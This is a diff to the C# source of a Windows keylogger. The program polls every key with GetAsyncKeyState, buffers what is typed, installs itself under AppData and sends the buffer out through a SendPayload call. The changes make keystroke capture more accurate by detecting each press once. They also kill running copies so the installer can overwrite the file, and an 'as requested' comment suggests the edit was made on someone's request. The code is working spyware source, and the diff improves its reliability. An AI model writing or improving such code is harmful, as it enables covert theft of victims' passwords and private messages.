@@ -21,6 +21,8 @@ namespace KeyLogger
 
         private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyLogger", "KeyLogger.exe");
 
+        private static bool[] lastKeyState = new bool[256];
+
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
@@ -29,6 +31,23 @@ namespace KeyLogger
         {
             if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
             {
+                // If disabled, also try to kill any running instance from the install path
+                // to make it "stop" as requested.
+                try
+                {
+                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
+                    {
+                        try
+                        {
+                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                            {
+                                process.Kill();
+                            }
+                        }
+                        catch { }
+                    }
+                }
+                catch { }
                 return;
             }
 
@@ -52,30 +71,31 @@ namespace KeyLogger
                 for (int i = 0; i < 255; i++)
                 {
                     int state = GetAsyncKeyState(i);
-                    if (state != 0)
+                    bool isDown = (state & 0x8000) == 0x8000;
+
+                    if (isDown && !lastKeyState[i])
                     {
+                        // Key just pressed
+                        lastKeyState[i] = true;
+
                         // Check for Space and Enter
-                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
-                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
-
+                        if (((Keys)i) == Keys.Space) { buf += " "; }
+                        else if (((Keys)i) == Keys.Enter) { buf += "\r\n"; }
                         // Skip mouse buttons
-                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
-
+                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) { /* ignore */ }
                         // Skip Shift, Ctrl, Alt, and other modifier keys
-                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
-                        if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
-                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;
-
+                        else if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) { /* ignore */ }
+                        else if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) { /* ignore */ }
+                        else if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) { /* ignore */ }
                         // Skip other non-essential keys
-                        if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
-                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
-                        if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
-                        if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
-                        if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
-                        if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;
-
+                        else if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) { /* ignore */ }
+                        else if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) { /* ignore */ }
+                        else if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) { /* ignore */ }
+                        else if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) { /* ignore */ }
+                        else if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) { /* ignore */ }
+                        else if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) { /* ignore */ }
                         // Handle single character keys
-                        if (((Keys)i).ToString().Length == 1)
+                        else if (((Keys)i).ToString().Length == 1)
                         {
                             char key = ((Keys)i).ToString()[0];
                             if (char.IsLetter(key) && isBig)
@@ -102,6 +122,11 @@ namespace KeyLogger
                             _ = SendPayload(buf);
                             buf = "";
                         }
+                    }
+                    else if (!isDown && lastKeyState[i])
+                    {
+                        // Key just released
+                        lastKeyState[i] = false;
                     }
                 }
             }
@@ -132,6 +157,20 @@ namespace KeyLogger
                     if (!Directory.Exists(installDirectory))
                     {
                         Directory.CreateDirectory(installDirectory);
+                    }
+
+                    // Kill existing process if it's running from InstallPath to allow overwrite
+                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
+                    {
+                        try
+                        {
+                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                            {
+                                process.Kill();
+                                process.WaitForExit(5000);
+                            }
+                        }
+                        catch { /* Ignore processes we can't access */ }
                     }
 
                     File.Copy(currentExe, InstallPath, true);
